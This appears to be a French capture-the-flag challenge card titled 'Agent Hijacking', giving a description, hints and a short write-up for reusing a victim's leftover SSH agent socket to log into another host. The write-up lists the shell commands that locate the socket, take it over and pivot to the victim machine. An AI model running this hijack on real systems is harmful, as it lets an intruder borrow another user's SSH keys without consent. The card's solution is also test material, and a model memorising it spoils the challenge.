# 26 - Agent Hijacking

## Nom du Challenge
Agent Hijacking

## Description
Un socket SSH agent laissé par une victime reste accessible. L'objectif est de pivoter via cet agent compromis.

## Difficulté
Expert

## Points
500 pts

## Format du Flag
IPNET{mot_de_passe_ou_cle}

## Hints
1. Cherche les sockets SSH_AUTH_SOCK actifs.
2. ssh-add -l permet de lister les clés agent.
3. Réutilise le socket pour une connexion sans passphrase.

## Solution (Write-up)
```bash
find /tmp -type s -name 'agent.*' 2>/dev/null
export SSH_AUTH_SOCK=<chemin_socket_trouve_par_find>
ssh-add -l
ssh -A victim@10.10.10.26
```
